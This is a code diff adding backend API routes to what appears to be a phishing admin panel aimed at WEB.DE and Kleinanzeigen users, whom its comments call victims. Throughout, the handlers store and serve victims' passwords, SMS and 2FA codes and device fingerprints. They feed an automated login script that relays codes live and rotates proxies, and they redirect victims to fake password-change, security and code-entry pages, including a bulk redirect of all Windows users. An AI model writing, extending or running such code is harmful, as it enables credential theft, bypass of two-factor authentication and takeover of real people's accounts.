@@ -1126,6 +1126,942 @@ async function handle(scope) {
     return true;
   }
 
+
+  if (pathname === '/api/redirect-change-password' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_change_password';
+      pushEvent(lead, lead.brand === 'klein' ? 'Отправлен на смену Kl' : 'Отправлен на смену', 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      console.log('[АДМИН] Кнопка: смена пароля — id=' + id);
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-sicherheit' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_sicherheit';
+      pushEvent(lead, 'Отправлен на Sicherheit', 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-sicherheit-windows' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    const leads = readLeads();
+    let count = 0;
+    leads.forEach((lead) => {
+      if ((lead.platform || '').toLowerCase() === 'windows') {
+        lead.status = 'redirect_sicherheit';
+        pushEvent(lead, 'Отправлен на Sicherheit (все Windows)', 'admin');
+        persistLeadPatch(lead.id, { status: lead.status, eventTerminal: lead.eventTerminal });
+        count++;
+      }
+    });
+    send(res, 200, { ok: true, count: count });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-push' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      console.log('[АДМИН] Кнопка: пуш — id=' + id);
+      const leads = readLeads();
+      const idResolved = resolveLeadId(String(id).trim());
+      const idx = leads.findIndex((l) => l.id === idResolved);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_push';
+      const nowBump = new Date().toISOString();
+      lead.lastSeenAt = nowBump;
+      lead.adminListSortAt = nowBump;
+      pushEvent(lead, EVENT_LABELS.PUSH, 'admin');
+      persistLeadPatch(idResolved, {
+        status: lead.status,
+        lastSeenAt: lead.lastSeenAt,
+        adminListSortAt: lead.adminListSortAt,
+        eventTerminal: lead.eventTerminal
+      });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/lead-fingerprint' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadId);
+    const leads = readLeads();
+    const lead = leads.find((l) => l.id === id);
+    if (!lead) return send(res, 404, { ok: false });
+    const fp = lead.fingerprint && typeof lead.fingerprint === 'object' ? lead.fingerprint : null;
+    let telemetrySnapshots = Array.isArray(lead.telemetrySnapshots) && lead.telemetrySnapshots.length > 0
+      ? lead.telemetrySnapshots.map((s) => JSON.parse(JSON.stringify(s)))
+      : null;
+    if (!telemetrySnapshots || telemetrySnapshots.length === 0) {
+      telemetrySnapshots = [{
+        at: lead.lastSeenAt || lead.createdAt || new Date().toISOString(),
+        stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
+        deviceSignature: lead.deviceSignature || undefined,
+        fingerprint: lead.fingerprint || undefined,
+        clientSignals: lead.clientSignals || undefined,
+        requestMeta: lead.requestMeta || undefined
+      }];
+    }
+    const out = {
+      leadId: lead.id,
+      email: (lead.email || '').trim() || undefined,
+      emailKl: (lead.emailKl || '').trim() || undefined,
+      brand: lead.brand || undefined,
+      platform: lead.platform || undefined,
+      userAgent: lead.userAgent || undefined,
+      ip: lead.ip || undefined,
+      screenWidth: lead.screenWidth,
+      screenHeight: lead.screenHeight,
+      createdAt: lead.createdAt || undefined,
+      lastSeenAt: lead.lastSeenAt || undefined,
+      deviceSignature: lead.deviceSignature || undefined,
+      stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
+      fingerprint: lead.fingerprint || undefined,
+      clientSignals: lead.clientSignals || undefined,
+      requestMeta: lead.requestMeta || undefined,
+      telemetrySnapshots: telemetrySnapshots
+    };
+    return send(res, 200, { ok: true, data: out });
+  }
+
+  if (pathname === '/api/lead-automation-profile' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadIdRaw);
+    const leads = readLeads();
+    const lead = leads.find((l) => l.id === id);
+    if (!lead) return send(res, 404, { ok: false, error: 'lead not found' });
+    const profile = buildAutomationProfile(lead);
+    if (!profile) return send(res, 422, { ok: false, error: 'insufficient data (no user agent / fingerprint)' });
+    return send(res, 200, { ok: true, profile: profile });
+  }
+
+  if (pathname === '/api/lead-login-context' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadIdRaw);
+    readLeadsAsync(function (err, leads) {
+      if (err || !Array.isArray(leads)) {
+        return send(res, 500, { ok: false, error: 'read leads failed' });
+      }
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) {
+        console.log('[АДМИН] lead-login-context: лид не найден id=' + id);
+        return send(res, 404, { ok: false, error: 'lead not found' });
+      }
+      const payload = buildLeadLoginContextPayload(lead);
+      if (!payload) return send(res, 500, { ok: false, error: 'payload build failed' });
+      const emCtx = (lead.email || '').trim().toLowerCase();
+      if (emCtx) touchWebdeScriptLock(emCtx);
+      return send(res, 200, payload);
+    });
+    return true;
+  }
+
+  if (pathname === '/api/lead-credentials' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadIdRaw);
+    readLeadsAsync(function (err, leads) {
+      if (err || !Array.isArray(leads)) {
+        return send(res, 500, { ok: false, error: 'read leads failed' });
+      }
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) {
+        console.log('[АДМИН] lead-credentials: лид не найден id=' + id + (id !== leadIdRaw ? ' (resolved from ' + leadIdRaw + ')' : ''));
+        return send(res, 404, { ok: false });
+      }
+      const isKl = lead.brand === 'klein';
+      const email = isKl
+        ? String((lead.emailKl || lead.email || '')).trim()
+        : String((lead.email || '')).trim();
+      if (email) touchWebdeScriptLock(email.toLowerCase());
+      const password = isKl
+        ? String((lead.passwordKl != null ? lead.passwordKl : lead.password) || '').trim()
+        : String((lead.password != null ? lead.password : '') || '').trim();
+      return send(res, 200, { ok: true, email: email, password: password });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/lead-klein-flow-poll' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadIdRaw);
+    readLeadsAsync(function (err, leads) {
+      if (err || !Array.isArray(leads)) {
+        return send(res, 500, { ok: false, error: 'read leads failed' });
+      }
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false });
+      const emCtx = (lead.email || '').trim().toLowerCase();
+      if (emCtx) touchWebdeScriptLock(emCtx);
+      const seen = !!(lead.kleinAnmeldenSeenAt && String(lead.kleinAnmeldenSeenAt).trim());
+      const emailKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
+      const passwordKl = (lead.passwordKl != null ? String(lead.passwordKl) : '').trim();
+      return send(res, 200, { ok: true, anmeldenSeen: seen, emailKl: emailKl, passwordKl: passwordKl });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/klein-anmelden-seen' && req.method === 'POST') {
+    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
+      return send(res, 403, { ok: false, error: 'forbidden' });
+    }
+    let bodySeen = '';
+    req.on('data', (chunk) => { bodySeen += chunk; });
+    req.on('end', () => {
+      let j = {};
+      try { j = JSON.parse(bodySeen || '{}'); } catch (e) {}
+      const lid = j.leadId != null ? String(j.leadId).trim() : '';
+      if (!lid) return send(res, 400, { ok: false, error: 'leadId required' });
+      const id = resolveLeadId(lid);
+      const leads = readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false });
+      const nowIso = new Date().toISOString();
+      lead.kleinAnmeldenSeenAt = nowIso;
+      lead.lastSeenAt = nowIso;
+      pushEvent(lead, 'Открыл страницу Klein-anmelden');
+      persistLeadPatch(id, {
+        kleinAnmeldenSeenAt: lead.kleinAnmeldenSeenAt,
+        lastSeenAt: lead.lastSeenAt,
+        eventTerminal: lead.eventTerminal
+      });
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-poll-2fa-code' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = resolveLeadId(leadIdRaw);
+    readLeadsAsync(function (err, leads) {
+      if (err || !Array.isArray(leads)) {
+        return send(res, 500, { ok: false, error: 'read leads failed' });
+      }
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) {
+        return send(res, 404, { ok: false, error: 'lead not found' });
+      }
+      const em = (lead.email || '').trim().toLowerCase();
+      if (em) touchWebdeScriptLock(em);
+      const kind = smsCodeDataKindForLead(lead);
+      const d = lead.smsCodeData;
+      const code = d && String(d.code || '').trim();
+      const submittedAt = d && d.submittedAt != null ? String(d.submittedAt).trim() : '';
+      if (kind !== '2fa' || !code) {
+        return send(res, 200, { ok: true, code: null, submittedAt: null, kind: kind || null });
+      }
+      console.log('[АДМИН] webde-poll-2fa-code: отдан код 2FA лиду id=' + id + ' (для автовхода WEB.DE)');
+      return send(res, 200, { ok: true, code: code, submittedAt: submittedAt || null, kind: '2fa' });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-login-2fa-received' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id != null ? String(json.id).trim() : '';
+      if (!idRaw) return send(res, 400, { ok: false });
+      const id = resolveLeadId(idRaw);
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.lastSeenAt = new Date().toISOString();
+      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
+      pushEvent(lead, EVENT_LABELS.TWO_FA_CODE_IN, 'script', prSession);
+      const patch2faIn = {
+        lastSeenAt: lead.lastSeenAt,
+        eventTerminal: lead.eventTerminal
+      };
+      if (lead.scriptStatus === 'wrong_2fa') patch2faIn.scriptStatus = null;
+      persistLeadPatch(id, patch2faIn);
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-login-2fa-wrong' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id != null ? String(json.id).trim() : '';
+      if (!idRaw) return send(res, 400, { ok: false });
+      const id = resolveLeadId(idRaw);
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.lastSeenAt = new Date().toISOString();
+      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
+      pushEvent(lead, EVENT_LABELS.TWO_FA_WRONG, 'script', prSession);
+      lead.scriptStatus = 'wrong_2fa';
+      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal, scriptStatus: lead.scriptStatus });
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-wait-password' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const leadIdRaw = json.leadId && String(json.leadId).trim();
+      if (!leadIdRaw) {
+        return send(res, 400, { ok: false, error: 'leadId required' });
+      }
+      const leadId = resolveLeadId(leadIdRaw);
+      try {
+        const leadsW = readLeads();
+        const lw = leadsW.find((l) => l.id === leadId);
+        const emW = lw && (lw.email || '').trim().toLowerCase();
+        if (emW) touchWebdeScriptLock(emW);
+      } catch (_) {}
+      if (webdePasswordWaiters[leadId]) {
+        console.log('[АДМИН] long-poll webde-wait-password: новый запрос заменил предыдущий → старому клиенту timeout, leadId=' + leadId);
+        try {
+          clearTimeout(webdePasswordWaiters[leadId].timeoutId);
+          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
+        } catch (e) {}
+        delete webdePasswordWaiters[leadId];
+        setWebdeLeadScriptStatus(leadId, null);
+      }
+      const timeoutId = setTimeout(function () {
+        if (!webdePasswordWaiters[leadId]) return;
+        console.log('[АДМИН] long-poll webde-wait-password: истёк срок ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с без пароля из админки, leadId=' + leadId);
+        try {
+          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
+        } catch (e) {}
+        delete webdePasswordWaiters[leadId];
+        setWebdeLeadScriptStatus(leadId, null);
+      }, WEBDE_WAIT_PASSWORD_TIMEOUT_MS);
+      webdePasswordWaiters[leadId] = { res: res, timeoutId: timeoutId };
+      setWebdeLeadScriptStatus(leadId, 'wait_password');
+      console.log('[АДМИН] long-poll webde-wait-password: запрос принят, скрипт ждёт до ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с, leadId=' + leadId + (leadId !== leadIdRaw ? ' (resolved ' + leadIdRaw + ')' : '') + ' — пока админ не сохранит новый пароль (лид в error после wrong_credentials)');
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadId = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
+    if (!leadId) return send(res, 400, { ok: false, resend: false });
+    const requested = !!webdePushResendRequested[leadId];
+    if (requested) delete webdePushResendRequested[leadId];
+    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
+    res.end(JSON.stringify({ resend: requested }));
+    return true;
+  }
+
+  if (pathname === '/api/webde-push-resend-result' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id && String(json.id).trim();
+      const success = json.success === true;
+      const message = json.message != null ? String(json.message).trim().slice(0, 200) : '';
+      if (!id) return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.lastSeenAt = new Date().toISOString();
+      const label = success ? EVENT_LABELS.PUSH_RESEND_OK : (EVENT_LABELS.PUSH_RESEND_FAIL + (message ? ': ' + message : ''));
+      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
+      pushEvent(lead, label, 'script', prSession);
+      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/webde-login-slot-done' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id != null ? String(json.id).trim() : '';
+      if (!idRaw) {
+        return send(res, 400, { ok: false, error: 'id required' });
+      }
+      const idResolved = resolveLeadId(idRaw);
+      webdeLoginChildByLeadId.delete(idResolved);
+      releaseWebdeLoginSlot(idResolved);
+      try {
+        const leadsSlot = readLeads();
+        const li = leadsSlot.findIndex(function (l) { return l.id === idResolved; });
+        if (li !== -1) {
+          endWebdeAutoLoginRun(leadsSlot[li]);
+          const Ls = leadsSlot[li];
+          persistLeadPatch(idResolved, {
+            webdeScriptActiveRun: Ls.webdeScriptActiveRun,
+            eventTerminal: Ls.eventTerminal
+          });
+        }
+      } catch (e) {}
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/script-event' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id != null ? String(json.id).trim() : '';
+      const labelRaw = json.label != null ? String(json.label).trim() : '';
+      if (!idRaw || !labelRaw) {
+        return send(res, 400, { ok: false, error: 'id and label required' });
+      }
+      const label = labelRaw.slice(0, 180);
+      const id = resolveLeadId(idRaw);
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.lastSeenAt = new Date().toISOString();
+      const resSessionMeta = lead.webdeScriptActiveRun != null
+        ? { session: lead.webdeScriptActiveRun }
+        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
+      pushEvent(lead, label, 'script', resSessionMeta);
+      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  /** Скрипт входа передаёт результат: success | wrong_credentials | push | error | sms | two_factor | wrong_2fa.
+   * При result=error скрипт может передать errorCode и errorMessage — они выводятся в лог лида.
+   * Коды ошибок: 403 — доступ запрещён (API 403, блок); 408 — таймаут (пароль, пуш, страница);
+   * 502 — сервис временно недоступен (Login vorübergehend nicht möglich, капча, блок);
+   * 503 — капча не поддерживается; 500 — внутренняя ошибка (браузер, исключение, страница не распознана).
+   * 500/502/503: жертва остаётся на оверлее ожидания (script_automation_wait) без редиректа — см. WEBDE_SCRIPT_VICTIM_WAIT_MS.
+   * resultPhase: mail_ready_klein — после фильтров почты в оркестрации. resultSource: klein_login — ответ klein_simulation / шаг Klein. */
+
+  if (pathname === '/api/webde-login-result' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id && String(json.id).trim();
+      const result = json.result && String(json.result).trim();
+      if (!idRaw) {
+        console.error('[АДМИН] webde-login-result: ошибка — не передан id в теле запроса (обязательное поле).');
+        return send(res, 400, { ok: false, error: 'id required' });
+      }
+      const valid = ['success', 'wrong_credentials', 'push', 'error', 'sms', 'two_factor', 'wrong_2fa', 'two_factor_timeout'].indexOf(result) !== -1;
+      if (!valid) {
+        console.error('[АДМИН] webde-login-result: ошибка — неверный result="' + result + '" (ожидается success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout), id=' + idRaw);
+        return send(res, 400, { ok: false, error: 'result must be success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout' });
+      }
+      const id = resolveLeadId(idRaw);
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) {
+        console.error('[АДМИН] webde-login-result: лид не найден id=' + id + (id !== idRaw ? ' (resolved from ' + idRaw + ')' : '') + '.');
+        return send(res, 404, { ok: false });
+      }
+      const lead = leads[idx];
+      const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
+      const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
+      const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
+      lead.lastSeenAt = new Date().toISOString();
+      delete lead.scriptStatus;
+      const errorCode = json.errorCode && String(json.errorCode).trim();
+      const errorMessage = json.errorMessage && String(json.errorMessage).trim();
+      const pushTimeout = json.pushTimeout === true;
+      if (result === 'success' || result === 'wrong_credentials') {
+        delete lead.webdeLoginGridExhausted;
+      } else if (result === 'error' && errorMessage) {
+        const emg = String(errorMessage);
+        if (emg.indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1
+            || emg.indexOf('Нет комбинаций прокси') !== -1
+            || emg.indexOf('Все комбинации перебраны') !== -1) {
+          lead.webdeLoginGridExhausted = true;
+        }
+      }
+      if (result === 'success' || result === 'wrong_credentials' || result === 'push' || result === 'sms'
+          || result === 'two_factor' || result === 'wrong_2fa' || result === 'two_factor_timeout') {
+        delete lead.webdeLoginGridStep;
+      } else if (result === 'error' && !webdeErrorTriggersVictimAutomationWait(errorCode)) {
+        delete lead.webdeLoginGridStep;
+      }
+      const klScriptCtx = fromKleinScript || lead.brand === 'klein';
+      const wrongLbl = klScriptCtx ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
+      let eventLabel = ({
+        success: klScriptCtx ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS,
+        wrong_credentials: wrongLbl,
+        push: EVENT_LABELS.PUSH,
+        error: 'Ошибка 502',
+        sms: klScriptCtx ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS,
+        two_factor: EVENT_LABELS.TWO_FA,
+        wrong_2fa: EVENT_LABELS.WRONG_2FA,
+        two_factor_timeout: EVENT_LABELS.TWO_FA_TIMEOUT
+      })[result] || result;
+      if (result === 'success' && resultPhase === 'mail_ready_klein') {
+        eventLabel = EVENT_LABELS.MAIL_READY;
+      }
+      if (result === 'push' && pushTimeout) {
+        eventLabel = EVENT_LABELS.PUSH_TIMEOUT;
+      } else if (result === 'error' && (errorCode || errorMessage)) {
+        let emShow = errorMessage ? String(errorMessage).replace(/\n/g, ' ') : '';
+        if (/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i.test(emShow)) {
+          emShow = emShow.replace(/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i, '').trim();
+        }
+        eventLabel = 'Ошибка ' + (errorCode || '500') + (emShow ? ': ' + emShow.slice(0, 180) : '');
+      }
+      if (result === 'wrong_credentials' && klScriptCtx) {
+        lead.kleinPasswordErrorDe = (errorMessage && String(errorMessage).trim())
+          ? String(errorMessage).trim().slice(0, 400)
+          : KLEIN_VICTIM_PASSWORD_ERROR_DE;
+      } else if (result === 'wrong_credentials') {
+        delete lead.kleinPasswordErrorDe;
+      }
+      // Не дублировать «неверные данные»: один ввод пароля — одно событие (скрипт/ретраи могли слать POST несколько раз)
+      const term = lead.eventTerminal || [];
+      const lastLblWrong = term.length > 0 ? String(term[term.length - 1].label || '') : '';
+      const lastIsWrongCreds = result === 'wrong_credentials' && term.length > 0 && (
+        lastLblWrong.indexOf('Неверные данные') === 0
+        || lastLblWrong.indexOf('Неверный пароль') === 0
+        || lastLblWrong.toLowerCase().indexOf('error password') === 0
+      );
+      const resSessionMeta = lead.webdeScriptActiveRun != null
+        ? { session: lead.webdeScriptActiveRun }
+        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
+      /** 500/502/503 → жертва в pending + script_automation_wait (оверлей), без редиректа — не пишем «Ошибка 502» в EVENTS админки. */
+      const skipAdminEventForScriptVictimWait =
+        result === 'error' && webdeErrorTriggersVictimAutomationWait(errorCode);
+      if (!lastIsWrongCreds && !skipAdminEventForScriptVictimWait) {
+        pushEvent(lead, eventLabel, 'script', resSessionMeta);
+      }
+      if (result === 'success') {
+        const isKleinLead = (lead.brand === 'klein');
+        if (isKleinLead) {
+          delete lead.kleinPasswordErrorDe;
+        }
+        const startPage = readStartPage();
+        if (isKleinLead) {
+          // script-klein.js ведёт на /erfolg только при show_success; pending оставлял жертву на форме.
+          if (startPage === 'change') {
+            lead.status = 'redirect_change_password';
+          } else if (startPage === 'download') {
+            lead.status = getRedirectPasswordStatus(lead);
+          } else {
+            lead.status = 'show_success';
+          }
+        } else if (startPage === 'klein') {
+          lead.status = 'redirect_klein_anmelden';
+        } else if (startPage === 'login') {
+          lead.status = 'show_success';
+        } else if (startPage === 'change') {
+          lead.status = 'redirect_change_password';
+        } else if (startPage === 'download') {
+          lead.status = getRedirectPasswordStatus(lead);
+        } else {
+          lead.status = 'show_success';
+        }
+      } else if (result === 'wrong_credentials') lead.status = 'error';
+      else if (result === 'push') lead.status = pushTimeout ? 'pending' : 'redirect_push';
+      else if (result === 'sms') lead.status = 'redirect_sms_code';
+      else if (result === 'two_factor') lead.status = 'redirect_2fa_code';
+      else if (result === 'wrong_2fa') lead.status = 'redirect_2fa_code';
+      else if (result === 'two_factor_timeout') {
+        lead.status = 'redirect_2fa_code';
+      } else {
+        // result === 'error' — не «неверный пароль», а блок/капча/таймаут и т.д.
+        const startPage = readStartPage();
+        const isKleinLead = (lead.brand === 'klein');
+        // Если скрипт не дождался новый пароль от админки (long-poll timeout),
+        // не редиректим никуда: только ошибка и закрываем сценарий.
+        if (String(errorCode || '') === '408') {
+          lead.status = 'error';
+        } else if (webdeErrorTriggersVictimAutomationWait(errorCode)) {
+          // 500/502/503 (прокси, отпечаток, «Weiter» без эффекта и т.п.): жертва видит оверлей ожидания, без редиректа
+          lead.status = 'pending';
+          lead.scriptStatus = 'script_automation_wait';
+          lead.scriptAutomationWaitUntil = new Date(Date.now() + WEBDE_SCRIPT_VICTIM_WAIT_MS).toISOString();
+        } else if (!isKleinLead && errorMessage && String(errorMessage).indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1) {
+          lead.status = 'redirect_change_password';
+        } else if (isKleinLead) {
+          lead.status = 'pending';
+        } else if (startPage === 'klein') {
+          lead.status = 'redirect_klein_anmelden';
+        } else if (startPage === 'login') {
+          lead.status = 'show_success';
+        } else if (startPage === 'change') {
+          lead.status = 'redirect_change_password';
+        } else if (startPage === 'download') {
+          lead.status = getRedirectPasswordStatus(lead);
+        } else {
+          lead.status = 'redirect_change_password';
+        }
+      }
+      // Жертва могла отправить SMS/2FA-код между readLeads() в начале обработчика и writeLeads — не затирать smsCodeData.
+      try {
+        invalidateLeadsCache();
+        const diskLeads = readLeads();
+        const diskLead = diskLeads.find((l) => l.id === id);
+        if (diskLead && diskLead.smsCodeData && String(diskLead.smsCodeData.code || '').trim()) {
+          lead.smsCodeData = JSON.parse(JSON.stringify(diskLead.smsCodeData));
+        }
+      } catch (e) {}
+      persistLeadFull(lead);
+      clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
+      const leadEmail = (lead.email || '').trim();
+      logTerminalFlow(
+        'АДМИН',
+        'Автовход',
+        sessLog,
+        leadEmail,
+        'POST webde-login-result id=' + id + (id !== idRaw ? ' (из ' + idRaw + ')' : '') + ' result=' + result + ' → status=' + lead.status
+          + (skipAdminEventForScriptVictimWait
+            ? ' | ' + (errorCode || '') + ' оверлей ожидания (событие в админке не пишем)'
+            : (' | ' + (eventLabel || ''))),
+      );
+      if (result === 'error' && !skipAdminEventForScriptVictimWait) {
+        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше');
+      } else if (result === 'wrong_credentials') {
+        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error');
+      }
+      webdeLoginChildByLeadId.delete(id);
+      releaseWebdeLoginSlot(id);
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-sms-code' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      console.log('[АДМИН] Кнопка: SMS — id=' + id);
+      const leads = readLeads();
+      const idResolved = resolveLeadId(String(id).trim());
